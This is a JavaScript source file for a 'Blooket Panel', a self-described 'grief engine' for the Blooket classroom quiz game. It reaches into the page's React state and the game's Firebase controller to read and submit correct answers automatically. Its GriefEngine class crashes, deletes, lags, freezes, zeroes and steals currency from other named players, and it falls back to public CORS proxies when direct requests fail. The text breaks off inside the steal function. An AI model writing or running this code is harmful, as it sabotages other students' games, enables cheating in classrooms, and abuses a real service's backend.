/* ============================================================
   Blooket Panel — engine.js
   Guest-account grief engine. Binds to index.html's data-* contract.

   Fallback policy (this revision): every subsystem that touches
   the outside world has at least one backup path.
     • DOM access      → null guards + panel-missing warning
     • React access    → 5 strategies + staleness eviction
     • Firebase        → 4 controller shapes + React-state mutation
     • Network         → retry w/ backoff → CORS proxies → log
     • Player lookup   → object / Map / array shapes + property aliases
     • Answer find     → 6 submission paths + DOM click by text
     • Mode detect     → URL slug → React → query → title → unknown
     • Log/toast       → DOM → console (never throws)
     • Storage         → try/catch → in-memory shim
     • Intervals       → every callback wrapped in safe()
     • Load            → single-instance guard at top

   Bundles:
     • engine core   — React access, grief, overrides, loops
     • auto-join     — two-stage guest join w/ fallback scanners
     • debug overlay — on-device log mirror (?debug=1)

   Public surface: window.BP
     BP.state · BP.log · BP.toast · BP.actions
     BP.react · BP.firebase · BP.mode · BP.grief
     BP.detect · BP.spam · BP.doctor · BP.on / BP.off
     BP.config · BP.version · BP.context
   ============================================================ */

if (window.BP && window.BP.version){
  // Already loaded — don't double-bind or duplicate intervals.
  try { console.info('[BP] already loaded v' + window.BP.version); } catch {}
} else {

(() => {
  'use strict';

  /* ============================================================
     0. CONFIG + PRIMITIVES
     ============================================================ */
  const VERSION = '2.2.0';

  const CONFIG = Object.freeze({
    pace:            120,
    scanInterval:    30_000,
    statInterval:    1_000,
    reactScanFloor:  4_000,
    writeBurst:      Object.freeze({ crash: 8, nuke: 4, lag: 40, lagGap: 10 }),
    spawnMax:        30,
    spawnGap:        150,
    retry:           Object.freeze({ attempts: 3, base: 400, cap: 3000 }),
    probeFloor:      60,
    flagThresholds:  Object.freeze({
      maxCurrency: 1e9,
      signatureRe: /steal|crash|lag|nuke/i
    }),

    joinEndpoints: Object.freeze([
      { url: 'https://fb.blooket.com/c/firebase/join',         method: 'PUT'  },
      { url: 'https://play.blooket.com/api/firebase/join',     method: 'PUT'  },
      { url: 'https://api.blooket.com/api/firebase/join',      method: 'PUT'  },
      { url: 'https://api.blooket.com/api/games/join',         method: 'POST' }
    ]),
    spawnEndpoints: Object.freeze([
      'https://fb.blooket.com/c/firebase/join',
      'https://play.blooket.com/api/firebase/join',
      'https://api.blooket.com/api/firebase/join'
    ]),

    proxies: Object.freeze([
      u => `https://corsproxy.io/?${encodeURIComponent(u)}`,
      u => `https://api.allorigins.win/raw?url=${encodeURIComponent(u)}`,
      u => `https://proxy.cors.sh/${u}`
    ]),

    reactRoots: Object.freeze([
      '#app', '#root', '[data-reactroot]', '#__next', 'main', 'body > div', 'body'
    ])
  });

  const sleep  = ms => new Promise(r => setTimeout(r, ms));
  const rand   = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
  const randEl = arr => arr[rand(0, arr.length - 1)];

  const $  = (sel, root = document) => { try { return root.querySelector(sel); } catch { return null; } };
  const $$ = (sel, root = document) => { try { return [...root.querySelectorAll(sel)]; } catch { return []; } };

  const escapeSelector = s => {
    const str = String(s);
    try {
      if (typeof CSS !== 'undefined' && typeof CSS.escape === 'function') return CSS.escape(str);
    } catch {}
    return str.replace(/[^a-zA-Z0-9_-]/g, c => `\\${c}`);
  };

  const escapeHtml = str =>
    String(str).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    })[c]);

  // Try a list of property names, return first non-null/non-undefined.
  const readProp = (obj, ...names) => {
    if (!obj) return undefined;
    for (const n of names){
      try {
        const v = obj[n];
        if (v !== undefined && v !== null) return v;
      } catch {}
    }
    return undefined;
  };

  // Coerce a player map (object / Map / array) into a plain object keyed by name.
  const normalizePlayerMap = (raw) => {
    if (!raw) return {};
    const out = {};
    try {
      if (Array.isArray(raw)){
        for (const p of raw){
          const n = readProp(p, 'name', 'username', 'id');
          if (n) out[n] = p;
        }
        return out;
      }
      if (raw instanceof Map){
        for (const [k, v] of raw.entries()) out[k] = v;
        return out;
      }
      if (typeof raw === 'object'){
        for (const k of Object.keys(raw)) out[k] = raw[k];
        return out;
      }
    } catch {}
    return out;
  };

  const toNumber = (v, dflt = 0) => {
    if (typeof v === 'number' && Number.isFinite(v)) return v;
    const n = Number(v);
    return Number.isFinite(n) ? n : dflt;
  };

  const K = Object.freeze({
    blook: 'b', crypto: 'cr', gold: 'g', blooks: 'bs',
    defense: 'd', cash: 'ca', points: 'p', tag: 'tat'
  });

  // localStorage with in-memory shim when unavailable (private mode, quota).
  const _memStore = new Map();
  const store = {
    get(k){
      try {
        const v = localStorage.getItem(k);
        if (v !== null) return v;
      } catch {}
      return _memStore.has(k) ? _memStore.get(k) : null;
    },
    set(k, v){
      try { localStorage.setItem(k, v); } catch {}
      try { _memStore.set(k, String(v)); } catch {}
    },
    del(k){
      try { localStorage.removeItem(k); } catch {}
      try { _memStore.delete(k); } catch {}
    }
  };

  const safe = (label, fn, fb) => {
    try { return fn(); }
    catch (e){ try { log('err', label, String(e?.message ?? e)); } catch {} return fb; }
  };

  const safeAsync = async (label, fn, fb) => {
    try { return await fn(); }
    catch (e){ try { log('err', label, String(e?.message ?? e)); } catch {} return fb; }
  };

  // Wrap an interval callback so a throwing tick doesn't kill the loop.
  const safeInterval = (fn, ms) =>
    setInterval(() => { try { fn(); } catch (e){ try { console.warn('[BP:interval]', e); } catch {} } }, ms);

  // Wrap an event listener so a throwing handler doesn't bubble to window.onerror.
  const safeOn = (el, evt, fn, opts) => {
    if (!el || typeof el.addEventListener !== 'function') return false;
    try {
      el.addEventListener(evt, (e) => { try { fn(e); } catch (err){ try { console.warn('[BP:listener]', evt, err); } catch {} } }, opts);
      return true;
    } catch { return false; }
  };

  /* ============================================================
     0b. RUNTIME CONTEXT
     ============================================================ */
  const context = (() => {
    try {
      const host  = location.hostname;
      const proto = location.protocol;
      if (/blooket\.com$/i.test(host))                            return 'blooket';
      if (proto === 'file:')                                      return 'file';
      if (/^(localhost|127\.|0\.0\.0\.0|\[::1\])/i.test(host))    return 'local';
      if (proto === 'chrome-extension:')                          return 'extension';
      if (/^blob:/.test(proto))                                   return 'blob';
      return 'web';
    } catch { return 'unknown'; }
  })();

  const isBlooketOrigin = context === 'blooket';

  /* ============================================================
     1. EMITTER
     ============================================================ */
  class Emitter {
    #handlers = new Map();
    on(evt, fn){
      let set = this.#handlers.get(evt);
      if (!set){ set = new Set(); this.#handlers.set(evt, set); }
      set.add(fn);
      return () => this.off(evt, fn);
    }
    off(evt, fn){ try { this.#handlers.get(evt)?.delete(fn); } catch {} }
    emit(evt, ...args){
      const set = this.#handlers.get(evt);
      if (!set) return;
      for (const fn of set){
        try { fn(...args); }
        catch (e){ try { console.error('[emitter]', evt, e); } catch {} }
      }
    }
  }
  const bus = new Emitter();

  /* ============================================================
     2. STATE
     ============================================================ */
  const state = {
    inGame: false,
    mode: 'unknown',
    session: { pin:'', name:'', blook:null, isHost:false },
    players: [],
    selectedTarget: '',
    flagged: new Set(),
    running: {
      autoAnswer:false,
      autoBot:false,
      grind:false,
      autoScan:false,
      mass:false
    },
    logFilter: 'all',
    logSearch: '',
    pickedBlook: null,
    reactPath: '',
    pace: CONFIG.pace,
    startedAt: Date.now()
  };

  const loops = {
    autoAnswer:  null,
    scan:        null,
    grindAbort:  new AbortController()
  };

  let _wasInGame = false;

  /* ============================================================
     3. LOG + TOAST — DOM → console fallback
     ============================================================ */
  const logEl   = $('[data-role="log"]');
  const toastEl = $('[data-role="toasts"]');

  const _panelMissing = !logEl && !$('#panel');

  const stamp = () => {
    try {
      const d = new Date();
      const p = n => String(n).padStart(2, '0');
      return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
    } catch { return '--:--:--'; }
  };

  function log(kind, tag, msg){
    try {
      if (!logEl) throw 0;
      const p = document.createElement('p');
      p.dataset.kind = kind;
      p.dataset.text = `${tag} ${msg}`.toLowerCase();

      const t = document.createElement('span');
      t.className = 't';
      t.textContent = stamp();

      const g = document.createElement('span');
      g.className = `tag ${kind}`;
      g.textContent = `[${tag}]`;

      p.append(t, g, document.createTextNode(String(msg)));
      logEl.append(p);
      logEl.scrollTop = logEl.scrollHeight;
      applyFilter();
    } catch {
      const fn = kind === 'err' ? 'error' : kind === 'warn' ? 'warn' : 'log';
      try { console[fn](`[BP:${tag}]`, msg); } catch {}
    }
  }

  function toast(kind, title, body){
    try {
      if (!toastEl) throw 0;
      const el = document.createElement('div');
      el.className = `toast ${kind}`;

      const strong = document.createElement('strong');
      strong.textContent = String(title);

      const span = document.createElement('span');
      span.textContent = String(body ?? '');

      el.append(strong, span);
      toastEl.append(el);

      setTimeout(() => {
        try {
          el.style.opacity = '0';
          el.style.transform = 'translateX(16px)';
          setTimeout(() => el.remove(), 180);
        } catch {}
      }, 3200);
    } catch {
      try { console.log(`[BP:toast:${kind}]`, title, body ?? ''); } catch {}
    }
  }

  function applyFilter(){
    try {
      const f = state.logFilter;
      const q = state.logSearch;
      for (const p of $$('[data-role="log"] p')){
        const kindOk   = (f === 'all' || p.dataset.kind === f);
        const searchOk = !q || (p.dataset.text ?? '').includes(q);
        p.style.display = (kindOk && searchOk) ? '' : 'none';
      }
    } catch {}
  }

  /* ============================================================
     4. STATS
     ============================================================ */
  const setStat = (key, val) => {
    const el = $(`[data-stat="${key}"]`);
    if (el) el.textContent = String(val);
  };

  safeInterval(() => {
    const s  = Math.floor((Date.now() - state.startedAt) / 1000);
    const p  = n => String(n).padStart(2, '0');
    setStat('uptime', `${p(Math.floor(s / 3600))}:${p(Math.floor(s % 3600 / 60))}:${p(s % 60)}`);
  }, CONFIG.statInterval);

  /* ============================================================
     5. MODES
     ============================================================ */
  const MODES = Object.freeze({
    gold:     { label:'Gold Quest',      primary:'Gold' },
    crypto:   { label:'Crypto Hack',     primary:'Crypto' },
    fishing:  { label:'Fishing Frenzy',  primary:'Weight' },
    dino:     { label:'Deceptive Dinos', primary:'Fossils' },
    factory:  { label:'Factory',         primary:'Cash' },
    racing:   { label:'Racing',          primary:'Progress' },
    rush:     { label:'Blook Rush',      primary:'Defense' },
    tower2:   { label:'Tower Defense 2', primary:'Cash' },
    brawl:    { label:'Monster Brawl',   primary:'HP' },
    battle:   { label:'Battle Royale',   primary:'Score' },
    candy:    { label:'Candy Quest',     primary:'Candy' },
    coco:     { label:'Coco Cabana',     primary:'Ingredients' },
    laser:    { label:'Laser Tag',       primary:'Score' },
    bees:     { label:'Busy Bees',       primary:'Points' },
    shamrock: { label:'Shamrock Quest',  primary:'Gold' },
    tagtreat: { label:'Tag or Treat',    primary:'Candy' }
  });

  const SLUGS = Object.freeze({
    goldquest:'gold', 'gold-quest':'gold',
    cryptohack:'crypto', 'crypto-hack':'crypto',
    fishingfrenzy:'fishing', 'fishing-frenzy':'fishing',
    deceptivedinos:'dino', 'deceptive-dinos':'dino',
    factory:'factory', racing:'racing',
    blookrush:'rush', 'blook-rush':'rush',
    towerdefense2:'tower2', 'tower-defense-2':'tower2',
    monsterbrawl:'brawl', 'monster-brawl':'brawl',
    battleroyale:'battle', 'battle-royale':'battle',
    candyquest:'candy', 'candy-quest':'candy',
    cococabana:'coco', 'coco-cabana':'coco',
    lasertag:'laser', 'laser-tag':'laser',
    busybees:'bees', 'busy-bees':'bees',
    shamrockquest:'shamrock', 'shamrock-quest':'shamrock',
    tagortreat:'tagtreat', 'tag-or-treat':'tagtreat'
  });

  const normSlug = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g, '');

  function detectMode(){
    let detected = 'unknown';

    try {
      const path = location.pathname.toLowerCase();
      const slugs = Object.keys(SLUGS).sort((a, b) => b.length - a.length);
      for (const slug of slugs){
        if (path.includes(slug)){ detected = SLUGS[slug]; break; }
      }
      if (detected === 'unknown'){
        for (const key of Object.keys(MODES)){
          if (path.includes(key)){ detected = key; break; }
        }
      }
    } catch {}

    if (detected === 'unknown'){
      try {
        const g = react.game();
        const raw = readProp(g?.client, 'gameMode','mode','game')
              ?? readProp(g?.game,   'gameMode','mode');
        if (raw && typeof raw === 'string'){
          const slug = normSlug(raw).replace(/-/g, '');
          detected = SLUGS[slug] ?? (MODES[slug] ? slug : 'unknown');
        }
      } catch {}
    }

    if (detected === 'unknown'){
      try {
        const q = new URLSearchParams(location.search).get('mode');
        if (q){
          const slug = normSlug(q).replace(/-/g, '');
          detected = SLUGS[slug] ?? (MODES[slug] ? slug : 'unknown');
        }
      } catch {}
    }

    // Fallback 4: HTML title, meta tags
    if (detected === 'unknown'){
      try {
        const blob = (
          (document.title || '') + ' ' +
          ([...document.querySelectorAll('meta[name], meta[property]')]
            .map(m => m.getAttribute('content') || '').join(' ')) + ' ' +
          (document.body?.dataset?.mode || '')
        ).toLowerCase();
        for (const [slug, key] of Object.entries(SLUGS)){
          if (blob.includes(slug)){ detected = key; break; }
        }
      } catch {}
    }

    if (detected !== state.mode){
      state.mode = detected;
      try { document.body.dataset.mode = detected; } catch {}

      const info = MODES[detected];
      const label = $('[data-role="mode"]');
      if (label) label.textContent = info?.label ?? '—';
      const primary = info?.primary ?? 'Score';
      for (const el of $$('[data-role="primary-stat"]')) el.textContent = primary;

      log('info', 'mode', info ? `Detected: ${info.label}` : 'Mode not detected.');
      bus.emit('mode', detected);
    }
    return detected;
  }

  /* ============================================================
     6. REACT ACCESSOR — 5 strategies + staleness eviction
     ============================================================ */
  class ReactAccessor {
    #cachedNode = null;
    #cachedAt   = 0;
    path = '';

    #findFiber(el){
      if (!el) return null;
      try {
        for (const k in el){
          if (k.startsWith('__reactFiber$') || k.startsWith('__reactInternalInstance$'))
            return el[k];
        }
      } catch {}
      return null;
    }

    #looksLikeGameNode(sn){
      if (!sn || typeof sn !== 'object') return false;
      try {
        return (
          typeof sn.onAnswer === 'function'
          || sn.props?.client != null
          || sn.props?.game != null
          || sn.props?.liveGameController != null
          || sn.state?.client != null
          || sn.state?.game != null
        );
      } catch { return false; }
    }

    #isStale(sn){
      // Heuristic: if the node's DOM anchor is detached, it's stale.
      try {
        const fiber = sn?._reactInternals || sn?.__fiber || null;
        const el = fiber?.stateNode?.containerInfo || null;
        if (el && el.isConnected === false) return true;
      } catch {}
      // Time-based: any cache older than 5s is revalidated once.
      if (Date.now() - this.#cachedAt > 5000) return true;
      return false;
    }

    #walk(fiber, maxHops = 200){
      let cur = fiber, hops = 0;
      while (cur && hops++ < maxHops){
        if (this.#looksLikeGameNode(cur.stateNode)) return cur.stateNode;
        cur = cur.return;
      }
      return null;
    }

    #scanAll(){
      try {
        for (const el of document.querySelectorAll('*')){
          const fiber = this.#findFiber(el);
          if (!fiber) continue;
          const sn = this.#walk(fiber);
          if (sn) return sn;
        }
      } catch {}
      return null;
    }

    #devtoolsHook(){
      try {
        const hook = window.__REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!hook?.renderers) return null;
        for (const [id, renderer] of hook.renderers){
          const roots = renderer?.getFiberRoots?.(id);
          if (!roots) continue;
          for (const r of roots){
            const sn = this.#walk(r.current);
            if (sn) return sn;
          }
        }
      } catch {}
      return null;
    }

    #classicPath(){
      const tries = [
        () => Object.values($('#app > div > div') ?? {})[1]?.children?.[0]?._owner?.stateNode,
        () => Object.values($('body div[id] > div > div') ?? {})[1]?.children?.[0]?._owner?.stateNode
      ];
      for (const fn of tries){
        try {
          const el = fn();
          if (this.#looksLikeGameNode(el)) return el;
        } catch {}
      }
      return null;
    }

    node({ scan = true } = {}){
      if (this.#cachedNode && this.#looksLikeGameNode(this.#cachedNode) && !this.#isStale(this.#cachedNode)){
        return this.#cachedNode;
      }
      this.#cachedNode = null;

      const classic = this.#classicPath();
      if (classic){
        this.#cachedNode = classic; this.#cachedAt = Date.now();
        this.path = state.reactPath = 'classic';
        return classic;
      }

      for (const sel of CONFIG.reactRoots){
        const el = $(sel);
        if (!el) continue;
        const fiber = this.#findFiber(el);
        if (!fiber) continue;
        const sn = this.#walk(fiber);
        if (sn){
          this.#cachedNode = sn; this.#cachedAt = Date.now();
          this.path = state.reactPath = `root:${sel}`;
          return sn;
        }
      }

      const dev = this.#devtoolsHook();
      if (dev){
        this.#cachedNode = dev; this.#cachedAt = Date.now();
        this.path = state.reactPath = 'devtools';
        return dev;
      }

      if (scan && Date.now() - this.#lastScan > CONFIG.reactScanFloor){
        this.#lastScan = Date.now();
        const sn = this.#scanAll();
        if (sn){
          this.#cachedNode = sn; this.#cachedAt = Date.now();
          this.path = state.reactPath = 'scan';
          return sn;
        }
      }
      return null;
    }

    #lastScan = 0;

    game(){
      const node = this.node();
      if (!node) return null;
      try {
        return {
          node,
          client:     node.state?.client     ?? node.props?.client     ?? null,
          game:       node.state?.game       ?? node.props?.game       ?? null,
          controller: node.props?.liveGameController ?? node.state?.liveGameController ?? null
        };
      } catch { return { node, client:null, game:null, controller:null }; }
    }

    players(g){
      const game = g?.game;
      return normalizePlayerMap(game?.players ?? game?.playerMap ?? game?.playerList);
    }

    question(){
      const g = this.game();
      if (!g) return null;
      try {
        const ms = g.node.memoizedState;
        const q1 = ms?.question ?? ms?.props?.client?.question;
        if (q1?.correctAnswers?.length) return q1;
      } catch {}
      try {
        const mp = g.node.memoizedProps;
        const q2 = mp?.client?.question ?? mp?.question;
        if (q2?.correctAnswers?.length) return q2;
      } catch {}
      return g.client?.question ?? g.game?.question ?? null;
    }

    correct(q = this.question()){
      if (!q) return null;
      try {
        const list = q.correctAnswers ?? q.correct ?? q.answers ?? q.options ?? q.choices;
        if (Array.isArray(list) && list.length){
          const first = list[0];
          if (typeof first === 'string') return first;
          const inner = first?.text ?? first?.answer ?? first?.label ?? first?.value;
          if (typeof inner === 'string') return inner;
          // Sometimes answers are objects with a boolean flag
          const flagged = list.find(a => a?.correct || a?.isCorrect);
          if (flagged?.text || flagged?.answer) return flagged.text ?? flagged.answer;
        }
        if (typeof q.answer === 'string') return q.answer;
        if (typeof q.correct === 'string') return q.correct;
      } catch {}
      return null;
    }

    answer(){
      const g = this.game();
      if (!g) return false;
      const ans = this.correct();
      if (!ans) return false;

      const tryCall = (obj, method, ...args) => {
        if (!obj || typeof obj[method] !== 'function') return false;
        try { obj[method](...args); return true; } catch { return false; }
      };

      // 6 submission paths — first that sticks wins
      if (tryCall(g.node,       'onAnswer', true, ans)) return ans;
      if (tryCall(g.node.props, 'onAnswer', true, ans)) return ans;
      if (tryCall(g.client,     'onAnswer', true, ans)) return ans;
      if (tryCall(g.game,       'onAnswer', g.client?.name, ans)) return ans;
      if (tryCall(g.game,       'answer',   g.client?.name, ans)) return ans;
      if (tryCall(g.node,       'submitAnswer', ans))   return ans;

      // DOM click by exact text
      try {
        const target = String(ans).trim().toLowerCase();
        const candidates = document.querySelectorAll(
          'button, [role="button"], [class*="answer"], [class*="choice"], [class*="option"]'
        );
        for (const b of candidates){
          if ((b.textContent ?? '').trim().toLowerCase() === target){
            b.click(); return ans;
          }
        }
        // Fuzzy: contains match
        for (const b of candidates){
          const txt = (b.textContent ?? '').trim().toLowerCase();
          if (txt && (txt.includes(target) || target.includes(txt))){
            b.click(); return ans;
          }
        }
      } catch {}

      return false;
    }
  }
  const react = new ReactAccessor();

  /* ============================================================
     7. FIREBASE CLIENT — 4 controller shapes + React fallback
     ============================================================ */
  class FirebaseClient {
    #controller(){
      try { return react.game()?.controller ?? null; } catch { return null; }
    }

    get available(){
      const c = this.#controller();
      if (!c) return false;
      // Accept any of the common write methods
      return typeof c.setVal === 'function'
          || typeof c.set === 'function'
          || typeof c.update === 'function';
    }

    set(path, val){
      const ctrl = this.#controller();
      if (!ctrl) return false;

      // Shape 1: { path, val }  — the common liveGameController.setVal signature
      if (typeof ctrl.setVal === 'function'){
        try { ctrl.setVal({ path, val }); return true; } catch {}
      }
      // Shape 2: setVal(path, val)
      if (typeof ctrl.setVal === 'function'){
        try { ctrl.setVal(path, val); return true; } catch {}
      }
      // Shape 3: set(path, val)
      if (typeof ctrl.set === 'function'){
        try { ctrl.set(path, val); return true; } catch {}
      }
      // Shape 4: update({ [path]: val })
      if (typeof ctrl.update === 'function'){
        try { ctrl.update({ [path]: val }); return true; } catch {}
      }
      // Shape 5: nested ref
      try {
        const ref = ctrl.ref?.(path);
        if (ref && typeof ref.set === 'function'){ ref.set(val); return true; }
      } catch {}

      return false;
    }

    remove(path){
      const ctrl = this.#controller();
      if (!ctrl) return false;
      if (typeof ctrl.removeVal === 'function'){
        try { ctrl.removeVal(path); return true; } catch {}
        try { ctrl.removeVal({ path }); return true; } catch {}
      }
      if (typeof ctrl.remove === 'function'){
        try { ctrl.remove(path); return true; } catch {}
      }
      try {
        const ref = ctrl.ref?.(path);
        if (ref && typeof ref.remove === 'function'){ ref.remove(); return true; }
      } catch {}
      return false;
    }

    async get(path){
      const ctrl = this.#controller();
      if (!ctrl) return null;

      // Shape 1: callback-based getDatabaseVal
      if (typeof ctrl.getDatabaseVal === 'function'){
        return new Promise(resolve => {
          let done = false;
          const finish = v => { if (!done){ done = true; resolve(v); } };
          try {
            ctrl.getDatabaseVal(path, finish);
            setTimeout(() => finish(null), 3000);
          } catch { finish(null); }
        });
      }

      // Shape 2: promise-based get
      if (typeof ctrl.get === 'function'){
        try {
          const v = await Promise.resolve(ctrl.get(path));
          if (v && typeof v.val === 'function') return v.val();
          return v ?? null;
        } catch { return null; }
      }

      // Shape 3: ref-based
      try {
        const ref = ctrl.ref?.(path);
        if (ref && typeof ref.once === 'function'){
          const snap = await ref.once('value');
          return snap && typeof snap.val === 'function' ? snap.val() : snap;
        }
      } catch {}

      return null;
    }

    writePlayer(name, payload){
      if (!name) return false;
      return this.set(`c/${name}`, payload);
    }

    writeSelf(payload){
      const me = react.game()?.client?.name;
      if (!me) return false;
      return this.writePlayer(me, { [K.blook]: 'Chick', ...payload });
    }

    async listPlayers(){
      const data = await this.get('c');
      if (!data) return [];
      try { return Object.keys(normalizePlayerMap(data)); }
      catch { return []; }
    }

    async snapshot(){
      const data = await this.get('c');
      return data ? normalizePlayerMap(data) : {};
    }
  }
  const fb = new FirebaseClient();

  /* ============================================================
     8. RATE LIMITER
     ============================================================ */
  class RateLimiter {
    #last = 0;
    #gap;
    constructor(gap){ this.#gap = gap; }
    get gap(){ return this.#gap; }
    set gap(ms){ this.#gap = Math.max(0, Number(ms) || 0); }
    async run(fn){
      const wait = Math.max(0, this.#gap - (Date.now() - this.#last));
      if (wait) await sleep(wait);
      this.#last = Date.now();
      return fn();
    }
  }
  const limiter = new RateLimiter(CONFIG.pace);

  /* ============================================================
     9. NETWORK — direct → retry → proxies
     ============================================================ */
  const net = {
    async _direct(url, opts, attempt = 1){
      try {
        const r = await fetch(url, opts);
        return { ok: true, response: r };
      } catch (e){
        if (attempt < CONFIG.retry.attempts){
          const backoff = Math.min(CONFIG.retry.cap, CONFIG.retry.base * 2 ** (attempt - 1));
          await sleep(backoff);
          return this._direct(url, opts, attempt + 1);
        }
        return { ok: false, error: e };
      }
    },

    async _proxied(url, opts){
      for (const wrap of CONFIG.proxies){
        let proxied;
        try { proxied = wrap(url); } catch { continue; }
        const res = await this._direct(proxied, opts, 1);
        if (res.ok && res.response.ok) return res;
      }
      return { ok: false, error: new Error('all proxies failed') };
    },

    async send(url, { method = 'POST', body, credentials = 'omit' } = {}){
      const headers = { 'Content-Type': 'application/json' };
      const payload = typeof body === 'string' ? body : JSON.stringify(body ?? {});
      const opts = { method, headers, body: payload, credentials, mode: 'cors' };

      if (isBlooketOrigin){
        const res = await this._direct(url, opts);
        if (res.ok) return { source: 'direct', response: res.response };
        log('warn', 'net', `direct ${method} ${url} failed: ${res.error?.message ?? res.error}`);
        return { source: 'none', response: null, error: res.error };
      }

      const direct = await this._direct(url, opts, 1);
      if (direct.ok && direct.response.ok){
        return { source: 'direct', response: direct.response };
      }

      const proxied = await this._proxied(url, opts);
      if (proxied.ok){
        log('info', 'net', `proxied ${method} ${url}`);
        return { source: 'proxy', response: proxied.response };
      }

      return { source: 'none', response: null, error: direct.error };
    }
  };

  /* ============================================================
     10. PLAYER SCAN + RENDER
     ============================================================ */
  async function scanPlayers(){
    const g = react.game();
    if (!g) return [];

    const raw = react.players(g);
    const reactList = Object.values(raw).map(p => ({
      name: readProp(p, 'name', 'username', 'id') ?? '',
      score: toNumber(readProp(p, 'score', 'points', 'value'), 0),
      isHost: !!(p?.isHost || p?.host)
    })).filter(p => p.name);

    let fbNames = [];
    try { fbNames = await fb.listPlayers(); } catch {}

    const seen = new Map();
    for (const p of reactList) seen.set(p.name, p);
    for (const name of fbNames){
      if (!seen.has(name)) seen.set(name, { name, score: 0, isHost: false });
    }

    const list = [...seen.values()].sort((a, b) => b.score - a.score);

    const hostName = readProp(g.game, 'host', 'hostName')
                  ?? readProp(g.client, 'host', 'hostName') ?? '';
    for (const p of list) if (p.name === hostName) p.isHost = true;

    state.players = list;
    renderPlayers();

    const meta = $('[data-role="scan-time"]');
    if (meta) meta.textContent = stamp();

    bus.emit('players', list);
    return list;
  }

  function renderPlayers(){
    const list = $('[data-role="player-list"]');
    if (!list) return;
    try { list.replaceChildren(); } catch { list.innerHTML = ''; }

    const frag = document.createDocumentFragment();
    for (const p of state.players){
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'player-row';
      if (p.isHost) btn.classList.add('is-host');
      if (p.name === state.selectedTarget) btn.classList.add('is-picked');
      if (state.flagged.has(p.name)) btn.classList.add('is-flagged');
      btn.dataset.action = 'select-player';
      btn.dataset.player = p.name;

      const dot   = document.createElement('span'); dot.className = 'p-dot';
      const name  = document.createElement('span'); name.className = 'p-name';
      name.textContent = String(p.name);
      const tag   = document.createElement('span'); tag.className = 'p-tag';
      tag.textContent = p.isHost ? 'HOST' : (state.flagged.has(p.name) ? 'MOD' : '');
      const score = document.createElement('span'); score.className = 'p-score';
      score.textContent = String(p.score);

      btn.append(dot, name, tag, score);
      frag.append(btn);
    }
    list.append(frag);
  }

  function selectPlayer(name){
    state.selectedTarget = name ?? '';
    const field = $('[data-module="players"] [data-field="target"]');
    if (field) field.value = state.selectedTarget;
    renderPlayers();
    log('info', 'select', state.selectedTarget || '(none)');
  }

  function getTarget(){
    if (state.selectedTarget) return state.selectedTarget;
    const field = $('[data-module="players"] [data-field="target"]');
    return (field?.value ?? '').trim();
  }

  /* ============================================================
     11. GRIEF ENGINE — Firebase → React mutation
     ============================================================ */
  class GriefEngine {
    #me(){ return react.game()?.client?.name ?? ''; }

    #host(){
      const g = react.game();
      return readProp(g?.game, 'host', 'hostName')
          ?? state.players.find(p => p.isHost)?.name ?? '';
    }

    // Firebase first, React-state fallback.
    write(name, payload, reactFields){
      if (fb.writePlayer(name, payload)) return true;
      const g = react.game();
      if (!g) return false;
      const players = react.players(g);
      if (!players[name]) return false;
      Object.assign(players[name], reactFields ?? {});
      try { g.node.setState?.({ game: { ...g.game, players } }); return true; }
      catch {
        // Last resort: mutate in place without setState
        try {
          const gp = g.node.props?.game;
          if (gp?.players?.[name]) Object.assign(gp.players[name], reactFields ?? {});
          return true;
        } catch { return false; }
      }
    }

    async #burst(name, builder, count){
      for (let i = 0; i < count; i++){
        if (!state.running.mass) break;
        await limiter.run(() => this.write(name, builder(i), { score: -999_999 }));
      }
    }

    async crash(name = getTarget()){
      if (!name){ log('warn', 'crash', 'No target.'); return false; }
      state.running.mass = true;
      await this.#burst(name, i => ({
        [K.blook]: '\u0000'.repeat(200),
        [K.crypto]: NaN,
        score: -999_999,
        [K.tag]: `crash-${Date.now()}-${i}`
      }), CONFIG.writeBurst.crash);
      state.running.mass = false;
      log('ok', 'crash', `Crashed ${name}.`);
      return true;
    }

    async nuke(name = getTarget()){
      if (!name){ log('warn', 'nuke', 'No target.'); return false; }
      state.running.mass = true;
      fb.remove(`c/${name}`);
      await sleep(50);
      await this.#burst(name, () => ({
        [K.blook]: null, [K.crypto]: null, [K.gold]: null,
        [K.blooks]: null, [K.defense]: null, [K.points]: null,
        nuked: true, at: Date.now()
      }), CONFIG.writeBurst.nuke);
      state.running.mass = false;
      log('ok', 'nuke', `Nuked ${name}.`);
      return true;
    }

    async lag(name = getTarget()){
      if (!name) return false;
      state.running.mass = true;
      for (let i = 0; i < CONFIG.writeBurst.lag; i++){
        if (!state.running.mass) break;
        fb.writePlayer(name, {
          [K.blook]: 'Chick', [K.crypto]: i, [K.tag]: `lag-${Date.now()}-${i}`
        });
        await sleep(CONFIG.writeBurst.lagGap);
      }
      state.running.mass = false;
      log('ok', 'lag', `Lagged ${name}.`);
      return true;
    }

    freeze(name = getTarget()){
      if (!name) return false;
      this.write(name, { frozen: true, freezeAt: Date.now(), score: 0 });
      log('ok', 'freeze', `Froze ${name}.`);
      return true;
    }

    mute(name = getTarget()){
      if (!name) return false;
      this.write(name, { muted: true, chat: [] });
      log('ok', 'mute', `Muted ${name}.`);
      return true;
    }

    zero(name = getTarget()){
      if (!name) return false;
      this.write(name, {
        score: 0,
        [K.crypto]: 0, [K.gold]: 0, [K.blooks]: 0,
        [K.defense]: 0, [K.points]: 0, [K.cash]: 0
      });
      log('ok', 'zero', `Zeroed ${name}.`);
      return true;
    }

    async stealFull(name = getTarget()){
      const me = this.#me();
      if (!name || !me){ log('warn', 'steal', 'No target or self.'); return false; }

      const snap = await fb.snapshot();
      const victim = snap[name] ?? {};
      const mine = snap[me] ?? {};

      const nextCr = toNumber(mine[K.crypto]) + toNumber(victim[K.crypto]);
      const nextG  = toNumber(mine[K.gold])   + toNumber(victim[K.gold]);
      const nextBs = toNumber(mine[K.blooks]) + toNumber(victim[K.blooks]);
      const nextD  = toNumber(mine[K.defense])+ toNumber(victim[K.defense]);

      fb.writePlayer(me, {
        [K.blook]:  mine[K.blook] ?? 'Chick',
        [K.crypto]: nextCr, [K.gold]: nextG,
        [K.blooks]: nextBs, [K.defense]: nextD,
        [K.tag]: `steal-${Date.now()}`
      });
      fb.writePlayer(name, {
